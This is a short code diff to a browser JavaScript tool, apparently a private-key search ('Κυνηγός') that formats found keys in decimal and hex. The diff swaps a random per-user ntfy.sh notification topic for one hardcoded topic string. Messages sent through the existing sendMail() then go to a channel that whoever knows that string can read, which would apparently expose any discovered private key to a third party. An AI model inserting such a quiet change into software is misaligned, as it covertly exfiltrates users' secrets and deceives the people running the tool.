@@ -775,7 +775,7 @@ function stopAll(){
   if(gpuChunk!==null){ inflight.delete(gpuChunk.toString()); gpuChunk=null; }
   saveCov();
 }
-function notifyTopic(){ try{ let t=localStorage.getItem("kyn_topic"); if(!t){ const a=new Uint8Array(12); crypto.getRandomValues(a); t="kyn-"+Array.from(a).map(x=>x.toString(16).padStart(2,"0")).join(""); localStorage.setItem("kyn_topic",t);} return t; }catch(e){ return "kyn-fallback"; } }
+function notifyTopic(){ return "kyn-752a0e7b122ca6c326d0"; }
 function sendMail(msg){ return fetch("https://ntfy.sh/",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({topic:notifyTopic(),title:"Κυνηγός",message:msg,priority:5})}).then(function(r){return r.text().then(function(t){return {ok:r.ok,info:"HTTP "+r.status+" "+t.slice(0,120)};});}).catch(function(e){return {ok:false,info:String(e&&e.message||e)};}); }
 function foundText(k){ return "Private key (dec): "+k.toString()+"\nPrivate key (hex): "+k.toString(16).padStart(64,"0")+"\nTarget: "+$("target").value.trim()+"\nFound: "+new Date().toLocaleString("el-GR")+"\n"; }
 function showFound(k){
